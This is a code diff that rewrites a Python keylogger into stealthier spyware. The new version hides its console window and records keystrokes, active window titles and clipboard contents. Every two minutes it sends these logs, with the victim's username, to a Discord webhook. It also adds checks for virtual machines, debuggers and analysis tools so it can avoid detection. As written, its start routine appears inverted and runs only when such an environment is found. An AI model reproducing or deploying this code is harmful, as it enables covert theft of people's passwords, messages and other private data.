@@ -1,15 +1,26 @@
 import os
+import zlib
 import unicodedata
+from threading import Timer
 from datetime import datetime
-from pynput import keyboard as kb
-from pynput.keyboard import Key
-import keyboard
-import pyautogui
+from discord_webhook import DiscordWebhook, DiscordEmbed
+from pynput.keyboard import Listener, Key
 import pyperclip
+import keyboard
 import win32gui
+import re
+import subprocess
+import ctypes
+import platform
+import time
+import psutil
+from concurrent.futures import ThreadPoolExecutor
+from dotenv import load_dotenv
 
-current_window = None
+load_dotenv()
 
+SEND_REPORT_EVERY = 120
+WEBHOOK = os.getenv("WEBHOOK_URL")
 special_keys = {
     Key.alt_l: "",
     Key.alt_r: "",
@@ -57,74 +68,124 @@ special_keys = {
     Key.media_play_pause: " [Play/Pause] "
 }
 
-def get_active_window():
-    try:
-        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
-    except Exception:
-        return "Unknown Window"
+class Keylogger:
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
+        keyboard.add_hotkey("ctrl+v", self.clipboard, suppress=False)
+        ctypes.windll.kernel32.FreeConsole()
 
-def log_window_change():
-    global current_window
-    new_window = get_active_window()
-    if new_window != current_window and new_window.strip():
-        current_window = new_window
-        path = os.path.join(os.getenv("USERPROFILE"), "result.log")
-        with open(path, "a", encoding="utf-8") as file:
-            file.write("\n" + ("=" * 50) + "\n" + "[Active Window]: " + current_window  + "\n")
-
-
-def on_press(key):
-    log_window_change()
-    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
-    with open(path, "a", encoding="utf-8") as file:
+    def is_vm(self):
+        if platform.system() == "Windows":
+            try:
+                output = subprocess.check_output(["wmic", "computersystem", "get", "model"], encoding="utf-8", timeout=3, creationflags=subprocess.CREATE_NO_WINDOW)
+                if any(vm in output for vm in ["Virtual", "VMware", "VirtualBox", "Hyper-V", "QEMU", "KVM", "Parallels"]):
+                    return True
+            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+                pass
         try:
-            if key in special_keys:
-                file.write(special_keys[key])
-            elif key is None:
-                file.write("\n" + "[Error]: Key press event was None" + "\n")
-            else:
-                char = key.char
-                try:
-                    unicodedata.name(char)
-                    file.write(unicodedata.normalize('NFC', char))
-                except (ValueError, AttributeError):
-                    file.write("\n" + "[Unknown Key]: " f"\"{str(key)}\"" + "\n")
+            output = subprocess.check_output(["getmac"], encoding="utf-8", timeout=3, creationflags=subprocess.CREATE_NO_WINDOW)
+            if bool(re.search(r"(00:05:69|00:0C:29|00:50:56|00:1C:14|00:03:FF|00:05:00)", output)):
+                return True
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+            pass
+        paths = ["C:\\Program Files\\VMware\\VMware Tools", "C:\\Program Files\\Oracle\\VirtualBox Guest Additions", "C:\\Windows\\System32\\drivers\\VBoxGuest.sys", "C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\VBoxSF.sys", "C:\\Program Files\\WindowsApps\\Microsoft.WindowsSandbox_"]
+        if any(os.path.exists(path) for path in paths):
+            return True
+        try:
+            if bool(ctypes.windll.kernel32.IsProcessorFeaturePresent(29)):
+                return True
+        except (AttributeError, OSError):
+            pass
+        try:
+            if bool(ctypes.windll.kernel32.IsDebuggerPresent()):
+                return True
+        except (AttributeError, OSError):
+            pass
+        sus_procs = {"vmtoolsd", "vboxservice", "wireshark", "fiddler", "sandboxie", "processhacker"}
+        with ThreadPoolExecutor() as executor:
+            futures = {executor.submit(lambda proc: proc.info.get("name", "").lower(), proc): proc for proc in psutil.process_iter(["name"])}
+            if any(future.result() in sus_procs for future in futures):
+                return True
+        start_time = time.perf_counter()
+        for _ in range(1_000_000):
+            pass
+        if time.perf_counter() - start_time > 0.5:
+            return True
+        return False
+
+    def get_active_window(self):
+        try:
+            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        except Exception:
+            return "Unknown Window"
+
+    def log_window_change(self):
+        global current_window
+        new_window = self.get_active_window()
+        if new_window != current_window and new_window.strip():
+            current_window = new_window
+            self.log += f"\n{"=" * 50}\nWindow title: {current_window}\n"
+
+    def callback(self, key):
+        self.log_window_change()
+        try:
+            key = key.char
+            unicodedata.name(key)
         except AttributeError:
-            file.write(str(key))
+            if key in special_keys:
+                key = special_keys[key]
+            else:
+                key = str(key).replace("Key.", " [") + "]"
+        except (ValueError, AttributeError):
+            key = ""
+        self.log += key
 
-def screenshots():
-    log_window_change()
-    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
-    with open(path, "a", encoding="utf-8") as file:
-        folder_path = os.path.join(os.getenv("USERPROFILE"), "screenshots")
-        if not os.path.exists(folder_path):
-            os.makedirs(folder_path)
-        timestamp = datetime.now().strftime("%m%d%Y_%H%M%S_%f")
-        file_path = os.path.join(folder_path, f"screenshot_{timestamp}.png")
-        screenshot = pyautogui.screenshot()
-        screenshot.save(file_path)
-        file.write("\n" + "[PrtScn]: " + file_path + "\n")
+    def clipboard(self):
+        self.log_window_change()
+        self.log += f"\n[Clipboard]: {{\n{pyperclip.paste()}\n}}\n"
 
-def copy_clipboard_data():
-    log_window_change()
-    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
-    with open(path, "a", encoding="utf-8") as file:
-        clipboard_data = pyperclip.paste()
-        if clipboard_data:
-            file.write("\n[Clipboard data]: {\n" + clipboard_data + " \n}\n")
+    def report_to_webhook(self):
+        webhook = DiscordWebhook(url=WEBHOOK)
+        if len(self.log) > 2000:
+            try:
+                path = os.environ["temp"] + "\\report.txt"
+                with open(path, 'w+') as file:
+                    file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                    file.write(self.log)
+                with open(path, 'rb') as f:
+                    webhook.add_file(file=f.read(), filename='report.txt')
+                webhook.execute()
+                os.remove(path) 
+            except UnicodeError:
+                pass
         else:
-            file.write("\n" + "[Warning]: Clipboard data is empty" + "\n")
+            if len(self.log) > 0:
+                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+                webhook.add_embed(embed)    
+        webhook.execute()
 
-def write_date_to_file():
-    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
-    with open(path, "a", encoding="utf-8") as file:
-        current_date = datetime.now().strftime("%m/%d/%Y %H:%M")
-        file.write("\n" + ("#" * 50) + "\n[Date]: " + current_date + "\n" + ("#" * 50) + "\n")
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
 
-if __name__ == "main":
-    write_date_to_file()
-    keyboard.add_hotkey("print screen", screenshots, suppress=False)
-    keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
-    
-    with kb.Listener(on_press=on_press) as listener:
-        listener.join()
+    def start(self):
+        if self.is_vm():
+            self.start_dt = datetime.now()
+            with Listener(on_release=self.callback) as listener:
+                self.report()
+                listener.join()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger.start()
